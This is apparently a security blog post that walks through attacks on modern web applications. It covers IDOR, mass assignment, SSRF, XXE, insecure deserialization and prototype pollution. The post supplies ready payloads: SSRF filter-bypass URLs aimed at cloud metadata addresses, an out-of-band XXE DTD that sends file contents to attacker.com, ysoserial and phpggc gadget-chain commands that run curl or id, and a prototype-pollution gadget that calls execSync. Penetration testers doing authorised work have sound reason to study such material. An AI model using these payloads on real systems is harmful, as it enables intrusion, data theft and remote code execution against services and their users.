Web Application Hacking — The Modern OWASP Top 10 in Practice

2026-06-17 · 2 min read · Security · web owasp idor ssrf deserialization prototype-pollution

A practical attack walkthrough of current OWASP vulnerability classes with real payloads — IDOR, broken access control, SSRF, XXE, insecure deserialization, and prototype pollution — focused on finding them in modern frameworks where the textbook payload doesn't fire.

Textbook payloads against a deliberately vulnerable training app teach the concept but not the job. Modern frameworks add layers — ORMs, schema validation, auto-escaping templates — that block the naive version of every classic attack. This walkthrough focuses on the adjustment each one needs to actually fire against a real, modern stack.

Broken Access Control / IDOR

Modern APIs increasingly use UUIDs instead of sequential integer IDs specifically to defeat naive IDOR enumeration. That doesn't fix the underlying access-control gap — it just means you need a UUID belonging to another user before you can test the check, which you can usually get from a response that leaks one (a "recently viewed" list, an admin-facing endpoint, a webhook payload) rather than guessing it.

http UUID-based IDOR — the check is missing, not the obfuscation 
GET /api/orders/3f29a1c4-8e1b-4d2a-9c77-1a9b6e4f0d21 HTTP/1.1
Authorization: Bearer <your_own_low_priv_token>
Host: shop.example.com

# If this returns another user's order data using YOUR token,
# the UUID was never the control -- the missing ownership check was

Also test the inverse direction modern apps frequently miss: mass assignment via PATCH/PUT bodies. A user-editable profile endpoint that blindly binds the request body to a model can let you set fields the UI never exposes — role, isAdmin, accountTier — if the framework's serializer doesn't explicitly allowlist bindable fields.

http Mass assignment probe 
PATCH /api/users/me HTTP/1.1
Authorization: Bearer <your_token>
Content-Type: application/json

{"name": "Test User", "role": "admin", "isAdmin": true}

SSRF — Past the Naive Filter

Most modern apps that accept a URL parameter (webhook configuration, "import from URL", PDF/screenshot generation) now run a basic blocklist against localhost, 127.0.0.1, and 169.254.169.254. None of the bypasses below are new techniques — they're the standard responses to that exact blocklist, and they still work because the blocklist is checking the string, not the resolved destination.

BypassExample
Decimal/octal IP encodinghttp://2130706433/ (decimal for 127.0.0.1)
DNS rebinding to a domain you controlhttp://attacker-controlled-resolves-to-169.254.169.254.example.com/
Open redirect chaining through an allowed domainhttp://trusted-cdn.com/redirect?to=http://169.254.169.254/
IPv6 loopback / mapped formshttp://[::1]/ or http://[::ffff:127.0.0.1]/
URL parser inconsistency (`@` confusion)http://expected-allowed-host.com@169.254.169.254/
Always test the response-time delta

Even when the response body is filtered or generic, a blind SSRF candidate that takes measurably longer to respond when pointed at an internal-only address (versus a clearly external one) confirms the request is actually being made server-side — useful for proving impact even without a full response leak.

XXE — When the Parser Looks Hardened

Most current XML libraries disable external entity resolution by default, which kills the textbook <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> payload outright. Two angles still work against a "hardened by default" parser: finding a secondary XML-consuming code path that uses an older library version or an explicit insecure configuration (SVG upload handlers and SAML assertion parsers are repeat offenders), and error-based out-of-band exfiltration when in-band entity expansion is blocked but DTD parsing itself isn't fully disabled.

xml Out-of-band XXE via an external DTD (works against some "hardened" configs) 
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
<foo>&xxe;</foo>

<!-- evil.dtd, hosted on attacker.com: -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;

Insecure Deserialization — Beyond `pickle.loads`

The naive version of this finding is "the app calls pickle.loads on user input" — rare in production code anyone reviewed. The version that actually shows up: a framework's session mechanism, a caching layer, or a message queue payload silently round-trips a serialized object through the client, and a gadget chain in an already-loaded library (not anything the developers wrote) provides the RCE primitive.

bash Identifying and weaponising a Java deserialization sink 
# Decode a suspicious cookie/parameter — Java serialized objects start with this byte pattern
echo '<base64_blob>' | base64 -d | xxd | head -1
# ac ed 00 05 -- confirmed Java serialization magic bytes

# Generate a gadget chain matching a library already on the classpath
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/pwned' > payload.bin

# PHP equivalent -- generate against a known vulnerable class in the app's dependencies
phpggc Laravel/RCE13 system 'id' -b
Find the sink before reaching for a gadget chain

Spend the time identifying which serialization library and which loaded classes are actually on the target's classpath before generating a gadget chain blind — ysoserial/phpggc both support dozens of chains, and firing the wrong one produces a silent failure indistinguishable from "not vulnerable" rather than useful signal.

Prototype Pollution — The Node.js-Specific One

Prototype pollution is the modern-framework-specific entry on this list: a JavaScript object merge/clone utility (a vulnerable version of lodash.merge, a hand-rolled deep-merge for config objects, or a query-string parser that builds nested objects from bracket notation) lets an attacker set __proto__ properties on the base Object.prototype, which then propagate into every object in the application that doesn't explicitly own that property — turning a seemingly cosmetic config-merge bug into application-wide logic corruption or, in the right gadget, RCE.

http Probing for prototype pollution via query-string bracket notation 
GET /api/search?__proto__[isAdmin]=true&q=test HTTP/1.1
Host: app.example.com

# If a subsequent, unrelated request from the same session now
# behaves as if isAdmin were true anywhere object defaults are read
# without an explicit own-property check, the pollution succeeded
javascript The escalation: polluting a property a templating/exec gadget reads 
// If the app uses a template engine vulnerable to a known
// prototype-pollution-to-RCE gadget (several exist for older
// ejs/pug/handlebars versions chained with a vulnerable merge):
{
  "__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
  }
}
The thread connecting all six

Every one of these still works against a "modern, hardened" stack for the same underlying reason: the framework's default protection covers the textbook case, not the actual data flow your specific application built on top of it. UUIDs stop ID guessing, not missing ownership checks. Default XML parser settings stop the common payload, not a secondary code path on an older library. Finding the gap between what the framework defends and what the application actually does with user input is the entire skill — payloads are the easy part once you've found that gap.
